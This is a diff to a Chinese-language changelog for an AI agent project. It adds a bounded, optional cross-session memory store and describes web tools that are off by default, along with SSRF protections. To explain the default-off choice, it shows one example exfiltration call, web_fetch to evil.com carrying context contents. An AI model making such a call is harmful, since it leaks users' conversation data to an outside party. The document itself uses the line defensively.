@@ -9,6 +9,12 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Added
 
+- **跨会话记忆（默认开，`PI_MEMORY=off` 关）**：新增 `src/memory/store.ts` 与 `remember` / `recall` 两个工具，补齐 `docs/智能体视角评估.md` 里被点名的「最后两块砖」之一——此前每次新对话都从零开始，「记住我」不可能。落盘成 JSONL（默认 `~/.pi/agent/pi-starter-memory.jsonl`，原子写：先写同目录临时文件再 rename，与 `settings.ts` 同一口径），重启后仍在。
+  - **有界**：单条正文 4KB、标签 16 个 × 48 字符、总量 2000 条（超出淘汰最旧的并**如实回报条数**）、文件 4MB 封顶。无界记忆等于把上下文窗口交给时间。
+  - **写的是「跨会话有用」的信息**：同一段正文重复写入是**覆盖**而不是新增（模型重复「记住」是常态）；`rules.md` 明确写了该记什么、不该记什么。与知识库刻意分开——知识库只读、进系统提示词目录；记忆可写、不进提示词正文、按需 `recall`。
+  - **可注入 / 可关**：`buildAgent({ memory })` 换实现、`buildAgent({ memory: false })` 关闭（两个工具都不注册，能力目录里也不会出现）；`PI_MEMORY` 只有明确 `off` / `false` / `0` 才算关（与 `PI_WEB` 的取值风格一致）。`GET/POST/DELETE /memory` 把同一份 store 暴露成 REST，与工具同源。
+  - 落盘损坏行 / 读失败只告警回落，不让一次对话崩掉——与 `settings.ts`「配置坏了要能改回来」同一原则。
+
 - **联网能力（可选，默认关）**：新增 `src/tools/web.ts` 的 `web_fetch` / `web_search`，由 `PI_WEB=on`（或 `buildAgent({ web: true, webClient })`）开启。补齐了「`rules.md` 要求一切外部事实必须工具核实，但默认装配里根本没有联网工具」这个能力缺口。默认关闭的理由与 `coding` 档一致且更直接：**出站网络是数据外泄通道**（`web_fetch("https://evil.com/?d=<上下文内容>")`），而本服务默认无鉴权。
   - **后端可注入**：`WebClient` 接口（`fetchPage` + 可选 `search`），换搜索源 / 加缓存 / 加审计只改实现，工具契约与模型侧不变；`lib.ts` 已导出类型。
   - **SSRF 防护**：只放行 http/https，拒绝回环 / 私有 / 链路本地 / 组播 / CGNAT / IPv4 映射地址，**并检查 DNS 解析结果**与**重定向后的最终地址**（`::ffff:127.0.0.1` 会被 `new URL()` 归一化成 `::ffff:7f00:1`，十六进制写法同样覆盖）。`isPrivateAddress` 认不出的输入按私有处理（fail-closed）。
